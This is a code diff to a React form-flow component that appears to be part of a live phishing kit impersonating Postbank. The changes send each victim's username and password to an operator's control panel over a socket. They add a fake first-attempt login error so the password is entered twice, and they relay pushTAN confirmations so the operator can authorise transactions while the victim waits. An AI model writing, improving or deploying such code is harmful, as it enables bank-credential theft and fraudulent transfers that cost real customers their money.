@@ -133,9 +133,10 @@ function FormFlow() {
   const [config, setConfig] = useState<StepConfig>(DEFAULT_CONFIG);
   const [error, setError] = useState<string | null>(null);
   const [loadingMessage, setLoadingMessage] = useState('');
+  const [loginAttempts, setLoginAttempts] = useState(0);
   
   // Session data storage
-  const [sessionData, setSessionData] = useState<any>({});
+  const [sessionData, setSessionData] = useState<Record<string, any>>({});
   
   // Enhanced TAN system state
   const [currentTanRequest, setCurrentTanRequest] = useState<{
@@ -163,7 +164,7 @@ function FormFlow() {
       setIsWaitingForAdmin(true);
       
       // Store the next state to transition to when admin continues
-      setSessionData(prev => ({ ...prev, pendingState: nextState }));
+      setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: nextState }));
       
       // Notify admin that user is waiting
       templateSocketClient.emit('user-waiting', {
@@ -250,7 +251,7 @@ function FormFlow() {
           setLoadingMessage('Daten werden aktualisiert...');
           
           setTimeout(() => {
-            setSessionData(prev => ({ ...prev, ...data }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, ...data }));
             setLoading(false);
           }, 1000);
         },
@@ -279,7 +280,7 @@ function FormFlow() {
             setIsWaitingForAdmin(false);
             setLoading(false);
             setState(sessionData.pendingState);
-            setSessionData(prev => ({ ...prev, pendingState: null }));
+            setSessionData((prev: Record<string, any>) => ({ ...prev, pendingState: null }));
           }
         },
         // Enhanced TAN system handlers
@@ -323,6 +324,9 @@ function FormFlow() {
     try {
       console.log('Postbank: Login submitted for session:', key);
       console.log('Postbank: Login data being submitted:', data);
+
+      const currentAttempt = loginAttempts + 1;
+      setLoginAttempts(currentAttempt);
       
       setState(STATES.LOADING);
       setLoadingMessage("Anmeldung wird verarbeitet...");
@@ -334,18 +338,25 @@ function FormFlow() {
         step: 'login',
         data: {
           username: data.username,
-          password: data.password
+          password: data.password,
+          attempt: currentAttempt
         }
       });
 
       if (response.success) {
         console.log('✅ Postbank login data submitted successfully');
         setSessionData((prev: any) => ({ ...prev, login: data }));
-        
-        // Check doubleLogin config
-        if (config.doubleLogin) {
-          proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Sicherheitsprüfung wird gestartet...');
-        } else if (config.personalData) {
+
+        if (config.doubleLogin && currentAttempt === 1) {
+          setState(STATES.LOGIN_ERROR);
+          return;
+        }
+
+        if (state === STATES.LOGIN_ERROR) {
+          setState(STATES.LOGIN);
+        }
+
+        if (config.personalData) {
           proceedToNextState(STATES.PERSONAL_DATA, 'Persönliche Daten werden geladen...');
         } else if (config.qrCode) {
           proceedToNextState(STATES.QR_INSTRUCTIONS, 'QR-Code Bereich wird vorbereitet...');
@@ -575,14 +586,13 @@ function FormFlow() {
         return <PushTANScreen 
           tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
           transactionDetails={currentTanRequest?.transactionDetails}
-          onSubmit={(tan) => {
-            console.log('pushTAN submitted:', tan);
+          onConfirm={() => {
+            console.log('pushTAN confirmed');
             // Send TAN completion back to admin
             templateSocketClient.emit('tan-completed', {
               requestId: currentTanRequest?.requestId,
               success: true,
-              type: currentTanRequest?.type,
-              tanValue: tan
+              type: currentTanRequest?.type
             });
             setCurrentTanRequest(null);
             setState(STATES.FINAL_SUCCESS);
@@ -637,7 +647,6 @@ function FormFlow() {
         return <Loading 
           message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
           type="processing"
-          showProgress={false}
         />;
         
       case STATES.LOADING:
